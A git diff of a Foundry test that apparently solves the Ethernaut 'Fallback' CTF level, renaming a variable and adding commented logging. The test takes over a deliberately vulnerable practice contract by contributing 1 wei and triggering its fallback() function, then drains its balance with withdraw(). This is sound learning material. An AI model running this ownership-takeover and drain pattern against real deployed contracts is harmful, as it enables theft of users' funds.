@@ -27,37 +27,49 @@ contract FallbackTest is Test {
         ethernaut.registerLevel(fallbackFactory);
         vm.startPrank(attacker);
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        Fallback ethernautFallback = Fallback(payable(levelAddress));
+        Fallback fallbackContract = Fallback(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
 
         // Contribute one time to satisfy ownership change condition
-        ethernautFallback.contribute{value: 1 wei}();
+        fallbackContract.contribute{value: 1 wei}();
+
+        // assertFalse(fallbackContract.owner() == address(attacker));
+        // emit log_named_address(
+        //     "owner of the attacked contract(before hacking): ",
+        //     fallbackContract.owner()
+        // );
 
         emit log_named_uint(
             "Verify contribution state change: ",
-            ethernautFallback.getContribution()
+            fallbackContract.getContribution()
         );
 
         // Send Ether to the contract which triggers the `fallback()` function
-        payable(address(ethernautFallback)).call{value: 1 wei}("");
-        assertEq(ethernautFallback.owner(), attacker);
+        payable(address(fallbackContract)).call{value: 1 wei}("");
+        assertEq(fallbackContract.owner(), attacker);
+
+        // assertTrue(fallbackContract.owner() == address(attacker));
+        // emit log_named_address(
+        //     "owner of the attacked contract(before hacking): ",
+        //     fallbackContract.owner()
+        // );
 
         emit log_named_uint(
             "Contract balance (before): ",
-            address(ethernautFallback).balance
+            address(fallbackContract).balance
         );
 
         emit log_named_uint("Attacker balance (before): ", attacker.balance);
 
-        ethernautFallback.withdraw(); // Empty smart contract funds
-        assertEq(address(ethernautFallback).balance, 0);
+        fallbackContract.withdraw(); // Empty smart contract funds
+        assertEq(address(fallbackContract).balance, 0);
 
         emit log_named_uint(
             "Contract balance (after): ",
-            address(ethernautFallback).balance
+            address(fallbackContract).balance
         );
 
         emit log_named_uint("Attacker balance (after): ", attacker.balance);
